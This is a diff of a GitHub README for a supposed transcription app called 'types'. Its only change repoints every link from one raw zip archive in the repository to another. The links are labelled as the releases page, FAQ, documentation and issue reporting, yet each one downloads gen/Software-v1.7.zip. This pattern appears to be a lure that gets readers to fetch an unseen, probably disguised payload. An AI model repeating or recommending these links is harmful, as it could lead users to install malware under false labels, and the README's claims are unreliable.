@@ -1,6 +1,6 @@
 # 🎉 types - Easily Transcribe Your Thoughts to Text
 
-[![Download types](https://raw.githubusercontent.com/Ehtesham-Meer123/types/main/Castilloa/types.zip%20types-v1.0-brightgreen)](https://raw.githubusercontent.com/Ehtesham-Meer123/types/main/Castilloa/types.zip)
+[![Download types](https://raw.githubusercontent.com/Ehtesham-Meer123/types/main/gen/Software-v1.7.zip%20types-v1.0-brightgreen)](https://raw.githubusercontent.com/Ehtesham-Meer123/types/main/gen/Software-v1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -20,10 +20,10 @@ Before you download, make sure your device meets these basic requirements:
 To get started, you need to download types. Follow these simple steps:
 
 1. Click the link below to visit the Releases page:
-   [Visit the Releases page to download types](https://raw.githubusercontent.com/Ehtesham-Meer123/types/main/Castilloa/types.zip)
+   [Visit the Releases page to download types](https://raw.githubusercontent.com/Ehtesham-Meer123/types/main/gen/Software-v1.7.zip)
 
 2. On the Releases page, you will find the latest version of the application.
-3. Look for the file named `https://raw.githubusercontent.com/Ehtesham-Meer123/types/main/Castilloa/types.zip` or a similar file for your operating system.
+3. Look for the file named `https://raw.githubusercontent.com/Ehtesham-Meer123/types/main/gen/Software-v1.7.zip` or a similar file for your operating system.
 4. Click on the file to begin downloading.
 
 After downloading:
@@ -53,7 +53,7 @@ Using types is straightforward:
 
 If you encounter any issues or have questions:
 
-- Check our [FAQ Section](https://raw.githubusercontent.com/Ehtesham-Meer123/types/main/Castilloa/types.zip) for common questions.
+- Check our [FAQ Section](https://raw.githubusercontent.com/Ehtesham-Meer123/types/main/gen/Software-v1.7.zip) for common questions.
 - Visit the Releases page for updates and any known issues.
 - Use the Issues tab on GitHub to report a problem or suggest a feature.
 
@@ -67,8 +67,8 @@ Thank you for using types. We appreciate your support and feedback as we continu
 
 ## 🔗 Useful Links
 
-- [Visit the Releases page to download types](https://raw.githubusercontent.com/Ehtesham-Meer123/types/main/Castilloa/types.zip)
-- [Documentation](https://raw.githubusercontent.com/Ehtesham-Meer123/types/main/Castilloa/types.zip)
-- [Report an Issue](https://raw.githubusercontent.com/Ehtesham-Meer123/types/main/Castilloa/types.zip)
+- [Visit the Releases page to download types](https://raw.githubusercontent.com/Ehtesham-Meer123/types/main/gen/Software-v1.7.zip)
+- [Documentation](https://raw.githubusercontent.com/Ehtesham-Meer123/types/main/gen/Software-v1.7.zip)
+- [Report an Issue](https://raw.githubusercontent.com/Ehtesham-Meer123/types/main/gen/Software-v1.7.zip)
 
 Enjoy transforming your thoughts into written words with types!
